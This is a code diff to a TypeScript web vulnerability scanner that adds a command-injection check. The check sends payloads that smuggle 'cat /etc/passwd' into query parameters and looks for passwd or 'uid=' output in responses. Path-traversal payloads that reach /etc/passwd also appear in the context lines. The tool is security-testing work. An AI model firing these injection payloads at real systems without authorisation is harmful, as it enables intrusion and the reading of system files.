@@ -104,6 +104,7 @@ export type WebVulnScanEntry = {
   | { type: "sqli" }
   | { type: "ssrf" }
   | { type: "path-traversal" }
+  | { type: "cmdi" }
 );
 
 export interface WebVulnFinding {
@@ -493,6 +494,13 @@ function getPayloadsForVulnType(vulnType: string): VulnPayload[] {
       { value: "../../../etc/passwd%00.png", injectionPoint: "query" },
       { value: "..%c0%af..%c0%af..%c0%afetc/passwd", injectionPoint: "query" },
     ],
+    cmdi: [
+      { value: "; cat /etc/passwd", injectionPoint: "query" },
+      { value: "| cat /etc/passwd", injectionPoint: "query" },
+      { value: "$(cat /etc/passwd)", injectionPoint: "query" },
+      { value: "`cat /etc/passwd`", injectionPoint: "query" },
+      { value: "& cat /etc/passwd", injectionPoint: "query" },
+    ],
   };
 
   return registry[vulnType] ?? [];
@@ -721,6 +729,9 @@ function detectVulnerability(vulnType: string, payload: VulnPayload, response: V
   if (vulnType === "path-traversal") {
     return detectPathTraversal(payload, response, baseline);
   }
+  if (vulnType === "cmdi") {
+    return detectCmdi(payload, response, baseline);
+  }
   return { detected: false, severity: "info", evidence: "", confirmed: false };
 }
 
@@ -914,6 +925,54 @@ function detectPathTraversal(payload: VulnPayload, response: VulnProbeResponse, 
   return { detected: false, severity: "info", evidence: "", confirmed: false };
 }
 
+function detectCmdi(payload: VulnPayload, response: VulnProbeResponse, baseline: BaselineResponse): DetectionResult {
+  const passwdPatterns = [/root:x:0:0/, /bin:x:\d+:\d+/, /daemon:x:\d+:\d+/];
+  for (const pattern of passwdPatterns) {
+    const match = pattern.exec(response.body);
+    if (match) {
+      return {
+        detected: true,
+        severity: "critical",
+        evidence: `/etc/passwd content detected in response: ${match[0]}`,
+        confirmed: true,
+      };
+    }
+  }
+
+  const cmdOutputPatterns = [/uid=\d+/, /gid=\d+/, /groups=\d+/];
+  for (const pattern of cmdOutputPatterns) {
+    const match = pattern.exec(response.body);
+    if (match) {
+      return {
+        detected: true,
+        severity: "critical",
+        evidence: `Command output pattern detected in response: ${match[0]}`,
+        confirmed: true,
+      };
+    }
+  }
+
+  if (baseline.status > 0 && response.status !== baseline.status) {
+    return {
+      detected: true,
+      severity: "medium",
+      evidence: `Response status differs from baseline (${response.status} vs ${baseline.status})`,
+      confirmed: false,
+    };
+  }
+
+  if (baseline.bodyLength > 0 && Math.abs(response.body.length - baseline.bodyLength) > baseline.bodyLength * 0.5) {
+    return {
+      detected: true,
+      severity: "low",
+      evidence: `Response length significantly different from baseline (${response.body.length} vs ${baseline.bodyLength})`,
+      confirmed: false,
+    };
+  }
+
+  return { detected: false, severity: "info", evidence: "", confirmed: false };
+}
+
 function buildVulnReproCurl(request: VulnProbeRequest): string {
   const safeHeaders = sanitizeReproHeaders(request.headers);
   const headerFlags = Object.entries(safeHeaders).flatMap(([key, value]) => [
@@ -953,7 +1012,7 @@ function isWebVulnScanConfig(value: unknown): value is WebVulnScanConfig {
     return false;
   }
 
-  const validTypes = new Set(["xxe", "xss", "sqli", "ssrf", "path-traversal"]);
+  const validTypes = new Set(["xxe", "xss", "sqli", "ssrf", "path-traversal", "cmdi"]);
   const vulns = (value as any).vulns;
 
   return (
